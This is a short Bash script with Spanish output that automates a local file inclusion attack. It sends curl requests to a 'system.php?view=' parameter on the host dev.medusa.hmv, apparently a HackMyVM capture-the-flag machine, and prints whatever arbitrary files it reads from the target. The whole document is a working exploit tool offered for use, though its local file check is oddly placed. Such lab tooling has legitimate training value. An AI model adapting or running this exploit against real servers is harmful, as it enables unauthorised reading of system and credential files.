#!/bin/bash 

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function ctrl_c(){
  echo -e "\n\n${redColour}[!] Saliendo...${endColour}"
  exit 1
}

#CTRL + C 
trap ctrl_c INT 

declare -i parameter_counter=0 

banner=$(cat << "EOF"
                   ,--.
          ,--.  .--,`) )  .--,
       .--,`) \( (` /,--./ (`
      ( ( ,--.  ) )\ /`) ).--,-.
       ;.__`) )/ /) ) ( (( (`_) )
      ( (  / /( (.' "-.) )) )__.'-,
     _,--.( ( /`         `,/ ,--,) )
    ( (``) \,` ==.    .==  \( (`,-;
     ;-,( (_) ~6~ \  / ~6~ (_) )_) )
    ( (_ \_ (      )(      )__/___.'
    '.__,-,\ \     ''     /\ ,-.
       ( (_/ /\    __    /\ \_) )
        '._.'  \  \__/  /  '._.'
            .--`\      /`--.
                 '----' 
            By MiguelRega7
EOF
)

echo -e "$banner"

function lfiRead(){
  filename=$1
  echo -e "\n${yellowColour}[+]${endColour}${grayColour}Este es el contenido del archivo ${endColour}${redColour}$filename${endColour}${grayColour}:${endColour}\n"
  curl -s -X GET "http://dev.medusa.hmv/files/system.php?view=$filename"
}

function checkFileNotEmpty() {
  if [ ! -s "$1" ] || [ ! -n "$(cat $1)" ]; then
      echo -e "\n${redColour}[ERROR]${endColour}${grayColour} El archivo especificado no se puede leer: ${endColour}${redColour}$1${endColour}\n"
      exit 1
    fi
}

function helpPanel(){
  echo -e "\n${yellowColour}[i]${endColour}${grayColour}Uso:${endColour}\n"
  echo -e "\t${yellowColour}h)${endColour}${blueColour} Mostrar Panel de ayuda${endColour}"
  echo -e "\t${yellowColour}f)${endColour}${blueColour} Digita la ruta del archivo a leer con -f :\n${endColour}"
  exit 0
}

while getopts "hf:" arg; do 
  case $arg in 
    h) ;;
    f) filename=$OPTARG; let parameter_counter+=1;
  esac
done

if [ $parameter_counter -eq 1 ]; then
  checkFileNotEmpty "$filename"
  lfiRead "$filename"
else 
  helpPanel
fi

